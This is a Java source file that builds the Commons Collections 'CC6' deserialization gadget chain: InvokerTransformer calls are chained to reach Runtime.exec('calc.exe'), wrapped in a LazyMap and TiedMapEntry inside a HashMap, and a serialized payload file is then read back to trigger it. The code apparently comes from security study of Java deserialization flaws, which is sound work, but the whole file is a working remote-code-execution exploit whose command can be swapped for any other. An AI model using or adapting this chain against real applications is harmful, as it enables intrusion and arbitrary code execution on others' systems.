import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6_HashMap {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" })
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
        TiedMapEntry entry = new TiedMapEntry(new HashMap(),"achilles");

        HashMap hashMap = new HashMap();
        hashMap.put(entry,"achilles");

        Field field = entry.getClass().getDeclaredField("map");
        field.setAccessible(true);
        field.set(entry,lazyMap);

//        FileStream.writeSer(hashMap,"CC6_HashMap.ser");
        FileStream.readSer("CC6_HashMap.ser");
    }
}
